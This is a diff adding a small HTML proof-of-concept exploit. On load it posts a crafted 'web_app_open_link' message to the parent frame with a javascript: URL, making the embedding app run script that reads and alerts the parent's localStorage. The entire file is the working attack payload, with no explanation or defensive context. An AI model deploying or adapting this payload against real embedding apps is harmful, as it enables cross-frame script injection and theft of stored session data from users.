@@ -1,0 +1,7 @@
+<body onload=exploit()>
+<script>
+function exploit() {
+    window.parent.postMessage(JSON.stringify({eventType: 'web_app_open_link', eventData: {url: "javascript:alert(JSON.stringify(window.parent.localStorage))"}}), '*');
+}
+</script>
+</body>
